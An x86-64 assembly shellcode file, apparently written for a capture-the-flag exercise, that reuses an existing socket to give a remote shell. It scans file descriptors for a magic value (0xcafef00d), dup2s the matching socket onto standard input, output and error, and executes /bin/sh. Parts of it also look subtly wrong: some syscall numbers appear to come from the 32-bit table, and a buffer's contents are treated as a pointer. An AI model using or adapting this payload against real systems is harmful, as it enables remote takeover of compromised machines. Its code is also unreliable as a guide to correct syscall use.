	;; Evan Jensen 64bit socket reuse shellcode
	;; Paolo Soto
	;; 03.02.2013
	;; RDI, RSI, RDX, RCX, R8, and R9 then stack		
	;; read = 3, nanosleep = 162, 
 
BITS 64
global main

main:	

	xor rax,rax
oursleep:
	inc eax 
	jno oursleep

	xor rax,rax
oursleep2:
	inc eax 
	jno oursleep2

	;int 3			; debugging
	
	xor rdi,rdi
	mov dil,20		;adjust for the popularity of the ctf
	xor rcx,rcx
	mov cl,4
		
ourread:
	dec rdi
	jnz next

next:
	xor rax,rax			
	mov al,3		; rax needs system call number
	lea rsi,[rel buffer] ; TODO get rid of \0
	syscall
	cmp al,4
	jnz ourread

	mov rsi,[rel buffer] ; TODO get rid of \0
	;mov rdx, [rsi]
	cmp [rsi],dword 0xcafef00d
	jnz ourread

dup2: 	
	xor rsi,rsi	
	mov sil,2

copy:
	xor rax,rax
	mov al,33		;dup2
	syscall
	dec rsi
	jns copy

	;; now just some local shellcode
	xor rax,rax
	push rax
	mov rdi, 0x68732f2f6e69622f ;/bin/sh
	push rdi
	mov al,59 		;execve in unistd_64.h
	mov rdi,rsp
	xor rsi,rsi
	xor rdx,rdx
	syscall

buffer:
	dd 0
